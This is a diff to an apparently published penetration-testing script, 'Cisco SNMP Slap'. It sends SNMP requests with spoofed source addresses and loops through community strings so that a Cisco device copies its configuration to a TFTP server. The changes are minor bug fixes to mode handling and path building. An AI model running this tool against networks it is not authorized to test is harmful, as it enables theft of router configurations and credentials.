@@ -21,7 +21,7 @@
 # * Multi threading
 # * Comments
 
-version = "v0.3"
+version = "v0.3.1"
 
 print "Cisco SNMP Slap, ", version
 print "Darren McDonald, darren.mcdonald@nccgroup.com"
@@ -72,7 +72,7 @@ argc = len(sys.argv)
 if argc > 1:
 	mode = sys.argv[1]
 
-if argc == 6 and mode == "single":
+if argc == 6 and mode == "single_l":
 	print "Community file:  ", sys.argv[2]
 	filename = sys.argv[2]
 	print "TFTP Server IP  :  ", sys.argv[3]
@@ -87,7 +87,7 @@ if argc == 6 and mode == "single":
 	print "community strings loaded: ", community
 
 
-if argc == 6 and mode == "single_l":
+if argc == 6 and mode == "single":
 	print "Community String:  ", sys.argv[2]
 	community = sys.argv[2]
 	print "TFTP Server IP  :  ", sys.argv[3]
@@ -109,7 +109,7 @@ if argc == 8 and mode == "randmask":
 	srcmask = sys.argv[5]
 	print "Destination IP:    ", sys.argv[6]
 	dstip = sys.argv[6]
-	outpath = sys.argv[7] + "/cisco-config.txt"
+	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
 	print "TFTP Root Path:    ", outpath
 	configured = 1
 
@@ -124,7 +124,7 @@ if argc == 8 and mode == "seqmask":
 	srcmask = sys.argv[5]
 	print "Destination IP:    ", sys.argv[6]
 	dstip = sys.argv[6]
-	outpath = sys.argv[7] + "/cisco-config.txt"
+	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
 	print "TFTP Root Path:    ", outpath
 	configured = 1
 
@@ -140,7 +140,7 @@ if argc == 8 and mode == "seqmask_l":
 	srcmask = sys.argv[5]
 	print "Destination IP:    ", sys.argv[6]
 	dstip = sys.argv[6]
-	outpath = sys.argv[7] + "/cisco-config.txt"
+	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
 	print "TFTP Root Path:    ", outpath
 	configured = 1
 	with open( filename ) as infile:
@@ -158,7 +158,7 @@ if argc == 8 and mode == "randmask_l":
 	srcmask = sys.argv[5]
 	print "Destination IP:    ", sys.argv[6]
 	dstip = sys.argv[6]
-	outpath = sys.argv[7] + "/cisco-config.txt"
+	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
 	print "TFTP Root Path:    ", outpath
 	configured = 1
 	with open( filename ) as infile:
@@ -198,6 +198,8 @@ if mode == "single":
 if mode == "single_l":
 	l34=IP(src=srcip,dst=dstip)/UDP(sport=161,dport=161)
 	for c in community:
+		c = c.strip()
+		print dstip, "/ ", c
 		sendSNMP( l34, c )
 		checkFile()
 	quit()
